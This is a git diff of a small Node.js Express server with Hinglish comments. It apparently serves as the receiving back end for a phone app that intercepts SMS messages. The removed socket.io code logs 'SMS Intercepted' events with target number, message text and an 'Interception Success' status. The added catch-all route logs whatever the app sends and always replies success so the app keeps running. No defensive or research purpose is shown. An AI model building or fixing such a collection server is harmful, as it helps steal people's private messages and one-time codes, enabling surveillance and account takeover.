@@ -1,51 +1,25 @@
 const express = require('express');
-const http = require('http');
-const { Server } = require('socket.io');
-
 const app = express();
-const server = http.createServer(app);
 
-// Socket.io setup with CORS (App connection allow karne ke liye)
-const io = new Server(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
+app.use(express.json()); // JSON data ke liye
+app.use(express.urlencoded({ extended: true })); // Form data ke liye
 
-app.get('/', (req, res) => {
-    res.send('Server is Running Live!');
-});
+// Ye function har request ko handle karega, chahe URL kuch bhi ho
+app.all('*', (req, res) => {
+    console.log(`\n--- Nayi Request Aayi ---`);
+    console.log(`Method: ${req.method}`); // GET hai ya POST
+    console.log(`Path: ${req.path}`);     // /send hai ya kuch aur
+    console.log(`Data:`, req.body);      // App ne kya bheja
 
-// Jab koi device (App) connect ho
-io.on('connection', (socket) => {
-    console.log('--- Naya Device Connect Hua ---');
-    console.log('ID:', socket.id);
-
-    // 1. Outgoing/Incoming SMS receive karne ka event
-    // Note: 'sms_data' ko apne app ke event name se match karein
-    socket.on('sms_data', (data) => {
-        console.log('\n--- SMS Intercepted ---');
-        console.log('Target No:', data.to || 'N/A');
-        console.log('Message:', data.message || 'N/A');
-        console.log('Time:', data.time || 'N/A');
-        console.log('Status:', data.status || 'Interception Success');
-
-        // 2. App ko SUCCESS response bhejna
-        socket.emit('server_response', {
-            status: "success",
-            message: "Data received by server",
-            timestamp: new Date().toISOString()
-        });
-    });
-
-    socket.on('disconnect', () => {
-        console.log('Device Disconnected.');
+    // App ko hamesha Success bhejna taaki wo ruke nahi
+    res.status(200).json({
+        status: "success",
+        success: true,
+        message: "Request Processed"
     });
 });
 
-// Port configuration for Railway
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Server is live on port: ${PORT}`);
+app.listen(PORT, () => {
+    console.log(`Server fix ho gaya hai! Port: ${PORT}`);
 });
